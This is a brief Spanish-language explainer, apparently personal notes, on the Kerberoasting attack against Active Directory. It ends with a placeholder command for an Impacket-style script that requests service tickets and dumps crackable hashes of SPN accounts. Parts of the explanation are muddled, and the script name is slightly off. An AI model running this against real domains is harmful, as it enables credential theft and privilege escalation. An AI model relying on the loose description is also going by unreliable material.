# Que es un ataque de Kerberoasting?
Kerberoasting es un ataque que se centra en obtener acceso a mas recursos mediante una escalada de privilegios, esto permite a los atacantes, hacerse pasar por usuarios del dominio sin privilegios con atributos `SPN` y solicitar tickets `TGS` relacionados con el servicio de la memoria en un intento de descifrar los hashes `NTLM`.

# Efectuar ataque con GetUsersSPNs
Este ataque nos permite dumpear el hash de los usuarios que sean vulnerables.
```
python GetUsersSPNs.py <DOMINIO>/<usuario>:<contraseña> -dc-ip <ip_DC> -request
```
